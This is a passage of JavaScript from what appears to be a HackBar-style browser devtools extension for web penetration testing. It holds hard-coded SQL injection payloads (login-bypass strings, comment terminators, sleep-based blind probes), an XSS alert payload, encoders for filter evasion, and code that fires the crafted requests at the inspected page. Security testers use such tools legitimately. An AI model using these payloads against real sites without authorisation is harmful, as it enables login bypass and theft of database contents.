                        break; 
            case 'bpass4':
                        txt = "%00";
                        this.setSelectedText(txt);
                        break;  
            case 'bpass5':
                        txt = "%90";
                        this.setSelectedText(txt);
                        break; 
            case 'bpas6':
                        txt = "%2323";
                        this.setSelectedText(txt);
                        break; 
            case 'bpass7':
                        txt = ")--";
                        this.setSelectedText(txt);
                        break;  
            case 'bpass8':
                        txt = "--";
                        this.setSelectedText(txt);
                        break; 
            case 'bpass9':
                        txt = "--+-";
                        this.setSelectedText(txt);
                        break; 
                                 
            case 'dsub' :
                        txt = 'substring(database(),1,1)="a"';
                        this.setSelectedText(txt);
                        break; 
                        
            case 'dsub2' :
                        txt = "and sleep(10) and 1=1";
                        this.setSelectedText(txt);
                        break;   
                        
            case 'dsub3' :
                        txt = 'and sleep(10) and database()="xyz"';
                        this.setSelectedText(txt);
                        break;                                
                                  

                  
                  
                  
                                                          

            case 'pass' :
                        txt = "or 'x'='x";
                        this.setSelectedText(txt);
                        break;
            case 'pass1' :
                        txt = "'or'1='1";
                        this.setSelectedText(txt);
                        break;
            case 'pass2' :
                        txt = "' or '1'='1";
                        this.setSelectedText(txt);
                        break;
            case 'pass3' :
                        txt = "' or 'x'='x";
                        this.setSelectedText(txt);
                        break;   
            case 'pass4' :
                        txt = "1'or'1'='1";
                        this.setSelectedText(txt);
                        break;
            case 'pass5' :
                        txt = "' or 0=0 --";
                        this.setSelectedText(txt);
                        break;
            case 'pass6' :
                        txt = "or 0=0--";
                        this.setSelectedText(txt);
                        break;
            case 'pass7' :
                        txt = "or 0=0 #";
                        this.setSelectedText(txt);
                        break;  
            case 'pass8' :
                        txt = "') or ('x'='x";
                        this.setSelectedText(txt);
                        break;
            case 'pass9' :
                        txt = "' or a=a-- ";
                        this.setSelectedText(txt);
                        break;
            case 'pass10' :
                        txt = "hi') or ('a'='a";
                        this.setSelectedText(txt);
                        break;
            case 'pass11' :
                        txt = "') or ('x')=('x";
                        this.setSelectedText(txt);
                        break;   
            case 'pass12' :
                        txt = "or 1=1#";
                        this.setSelectedText(txt);
                        break;
            case 'pass13' :
                        txt = "admin' or '1'='1'#";
                        this.setSelectedText(txt);
                        break;
            case 'pass14' :
                        txt = "admin' or '1'='1 ";
                        this.setSelectedText(txt);
                        break;
            case 'pass15' :
                        txt = "admin') or ('1'='1'/*";
                        this.setSelectedText(txt);
                        break;   
            case 'pass16' :
                        txt = "') or true--";
                        this.setSelectedText(txt);
                        break;
            case 'pass17' :
                        txt = "admin' or 1=1#";
                        this.setSelectedText(txt);
                        break;
            case 'pass18' :
                        txt = "admin') or '1'='1'--";
                        this.setSelectedText(txt);
                        break;                                
                                 




















































































        case 'mysqlbasicinfo':
            newString = SQL.selectionMySQLBasicInfo();
            this.setSelectedText(newString);
            break;
        case 'mysqlconvertutf8':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = SQL.selectionMySQLConvertUsing('utf8', txt);
                this.setSelectedText(newString);
            }
            break;
        case 'mysqlconvertlatin1':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = SQL.selectionMySQLConvertUsing('latin1', txt);
                this.setSelectedText(newString);
            }
            break;
        case 'mysqltosqlchar':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = SQL.selectionToSQLChar('mysql', txt);
                this.setSelectedText(newString);
            }
            break;
        case 'mssqltosqlchar':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = SQL.selectionToSQLChar('mssql', txt);
                this.setSelectedText(newString);
            }
            break;
        case 'oracletosqlchar':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = SQL.selectionToSQLChar('oracle', txt);
                this.setSelectedText(newString);
            }
            break;
        case 'unionselect':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = SQL.selectionToUnionSelect(txt);
                this.setSelectedText(newString);
            }
            break;
        case 'spacestocomments':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = SQL.selectionToInlineComments('oracle', txt);
                this.setSelectedText(newString);
            }
            break;
        case 'stringtocharcode':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = XSS.selectionToChar('stringFromCharCode', txt);
                this.setSelectedText(newString);
            }
            break;
        case 'stringtohtmlcharcode':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = XSS.selectionToChar('htmlChar', txt);
                this.setSelectedText(newString);
            }
            break;
		case 'speciastringtohtmlchar':
            txt = this.getSelectedText();
            if (txt !== false) {
				newString = txt.replace(/&/g,"&amp;");
				newString = newString.replace(/</g,"&lt;");
				newString = newString.replace(/>/g,"&gt;");
				newString = newString.replace(/ /g,"&nbsp;");
				newString = newString.replace(/"/g,'&quot;');
                this.setSelectedText(newString);
            }
            break;
        case 'xssalert':
            newString = 'alert(String.fromCharCode(88, 83, 83))';
            this.setSelectedText(newString);
            break;
        case 'base64encode':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = Encrypt.base64Encode(txt);
                this.setSelectedText(newString);
            }
            break;
        case 'base64decode':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = Encrypt.base64Decode(txt);
                this.setSelectedText(newString);
            }
            break;
        case 'urlencode':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = urlencode(txt);
                this.setSelectedText(newString);
            }
            break;
        case 'urldecode':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = unescape(txt);
                this.setSelectedText(newString);
            }
            break;
        case 'md5hash':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = Encrypt.md5(txt);
                this.setSelectedText(newString);
            }
            break;
        case 'sha1hash':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = Encrypt.sha1(txt);
                this.setSelectedText(newString);
            }
            break;
        case 'sha256hash':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = Encrypt.sha2(txt);
                this.setSelectedText(newString);
            }
            break;
        case 'rot13':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = Encrypt.rot13(txt);
                this.setSelectedText(newString);
            }
            break;
        case 'addslashes':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = MISC.addSlashes(txt);
                this.setSelectedText(newString);
            }
            break;
        case 'stripslashes':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = MISC.stripSlashes(txt);
                this.setSelectedText(newString);
            }
            break;
        case 'stripspaces':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = MISC.stripSpaces(txt);
                this.setSelectedText(newString);
            }
            break;
        case 'reverse':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = MISC.reverseString(txt);
                this.setSelectedText(newString);
            }
            break;
        case 'replace':
            if (text2replacefield.value || ''){
                var text2replace = text2replacefield.value;
                var replacement = replacementfield.value;
                txt = this.currentFocusField.value;
                newString = txt.replace(new RegExp(text2replace, 'g'), replacement);
                this.currentFocusField.value = newString;
            }
            break;
        case 'plus':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = String(parseInt(txt)+1);
                this.setSelectedText(newString);
                execute();
            }

            break;
        case 'minus':
            txt = this.getSelectedText();
            if (txt !== false) {
                newString = String(parseInt(txt)-1);
                this.setSelectedText(newString);
                execute();
            }
            break;
		case 'charencode':
            txt = this.getSelectedText();
            if (txt !== false) {
				var charStringArray = [];
				var decimal;
				for (var c = 0; c < txt.length; c++) {
					decimal = txt.charCodeAt(c);
					charStringArray.push(decimal);
				}
				var charString = '';
				charString = 'CHAR(' + charStringArray.join(', ') + ')';
                this.setSelectedText(charString);
            }
            break;
		case 'chardecode':
            txt = this.getSelectedText();
			var charStringArray=[]
            if (txt !== false) {
				charStringArray = txt.split(',');
				string = String.fromCharCode.apply(null,charStringArray);
				console.log("hello")
                this.setSelectedText(string);
            }
            break;
    }
    currentFocusField.focus();
}

/* ---------- Actions --------- */

function getSelectedText() {
    var selectionStart = this.currentFocusField.selectionStart;
    var selectionEnd = this.currentFocusField.selectionEnd;
    if (selectionEnd - selectionStart < 1) {
        browser.devtools.inspectedWindow.eval("alert(\"Select text before using this function!\");")
            .then(function (result, isException) {
                // no action
            });
        return false;
    }
    return this.currentFocusField.value.substr(selectionStart, selectionEnd - selectionStart);
}

function setSelectedText(str) {
    var selectionStart = this.currentFocusField.selectionStart;
    var selectionEnd = this.currentFocusField.selectionEnd;
    var pre = this.currentFocusField.value.substr(0, selectionStart);
    var post = this.currentFocusField.value.substr(selectionEnd, this.currentFocusField.value.length);
    this.currentFocusField.value = pre + str + post;
    this.currentFocusField.selectionStart = selectionStart;
    this.currentFocusField.selectionEnd = selectionStart + str.length;
}


function urlencode(inputstr) {
    var newString = encodeURI(inputstr);
    newString = newString.replace(/\*/g, '%2a');
    newString = newString.replace(/\//g, '%2f');
    newString = newString.replace(/\+/g, '%2b');
    newString = newString.replace(/\'/g, '%27');
    return newString;
}

function htmlEscape(inputstr) {
    return inputstr
        .replace(/&/g, '&amp;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

function htmlUnescape(inputstr){
    return inputstr
        .replace(/&quot;/g, '"')
        .replace(/&#39;/g, "'")
        .replace(/&lt;/g, '<')
        .replace(/&gt;/g, '>')
        .replace(/&amp;/g, '&');
}

function loadUrl() {
    browser.devtools.inspectedWindow.eval("window.location.href")
        .then(function (result, isException) {
                if (isException)
                    urlfield.value = "";
                else
                    result = result.slice(0,-1);
                    urlfield.value = result;
            }
        );
}

function splitUrl() {
    var uri = currentFocusField.value;
    uri = uri.replace(new RegExp(/&/g), "\n&");
    uri = uri.replace(new RegExp(/\?/g), "\n?");
    currentFocusField.value = uri;
    return true;
}

var typePostdata = "";

function getPostData() {
    var dataString = postdatafield.value;
    if (dataString || '') {
        if (dataString.indexOf("Content-Disposition: form-data; name=") > -1) {
            typePostdata = "multipart";
            return dataString;
        }
        if (dataString.indexOf("&") > -1) {
            typePostdata = "formdata";
            dataString = dataString.replace(new RegExp(/\n|\r/g), '');
            dataString = dataString.replace(new RegExp(/\+/g), "%2B");
            return dataString.split('&');
        }
        if (dataString.indexOf("=") > -1) {
            typePostdata = "formdata";
            dataString = dataString.replace(new RegExp(/\n|\r/g), '');
            dataString = dataString.replace(new RegExp(/\+/g), "%2B");
            return [dataString];
        }
    }
    typePostdata = "raw";
    return dataString;
}

function execute() {
    var url= urlfield.value;
    url = url.replace(new RegExp(/\n|\r/g), '');
    if (refererCbx.checked) {
        browser.runtime.sendMessage({
            urlfield: url,
            refererfield: refererfield.value
        });
    }

    var _url = url.substr(0, url.indexOf('?'));
    var _query = url.substr(url.indexOf('?') + 1);

    if (!postdataCbx.checked) { // just get method
        browser.devtools.inspectedWindow.eval("window.location.href = '" + _url + "?" + urlencode(_query) + "';")
            .then(function (result, isException) {
                //no action
            });
        return;
    }
    var postData = getPostData();
    if (typePostdata === "formdata") {
        var scriptpost = 'document.body.innerHTML += \'<form id="hackbardynForm" action="' + _url + "?" + urlencode(_query) + '" method="post">';
        for (var i = 0; i < postData.length; i++) {
            var field = postData[i].substr(0, postData[i].indexOf('='));
            var fieldvalue = postData[i].substr(postData[i].indexOf('=') + 1);
            scriptpost += '<input type="hidden" name="' + field + '" value="' + htmlEscape(fieldvalue) + '">';
        }
        scriptpost += '</form>\';document.getElementById("hackbardynForm").submit();';
        browser.devtools.inspectedWindow.eval(scriptpost)
            .then(function (result, isException) {
                //no action
            });
    }
    else // for raw data and mutilpart formdata
    {
        var responsePost = "";
        fetch(url, {
            method: "POST",
            redirect: 'follow',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cache': 'no-cache'
            },
            credentials: 'include',
            body: postdatafield.value
        }).then(function (response) {
            response.text().then(function (text) {
                responsePost = text;
                var scriptpost = 'document.body.innerHTML = unescape(\'' + urlencode(responsePost) + '\');window.history.pushState("", "", \'' + _url + "?" + urlencode(_query) +'\');';
                browser.devtools.inspectedWindow.eval(scriptpost)
                    .then(function (result, isException) {
                        //no action
                    });
            });
        });
    }
}

function togglepostdata() {
    if (postdataCbx.checked) {
        postdatacontainer.style.visibility = "visible";
        postdatacontainer.style.position = "relative";
    } else {
        postdatacontainer.style.visibility = "hidden";
        postdatacontainer.style.position = "absolute";
    }
}

function togglereferer() {
    if (refererCbx.checked) {
        referercontainer.style.visibility = "visible";
        referercontainer.style.position = "relative";
    } else {
        referercontainer.style.visibility = "hidden";
        referercontainer.style.position = "absolute";
    }
}
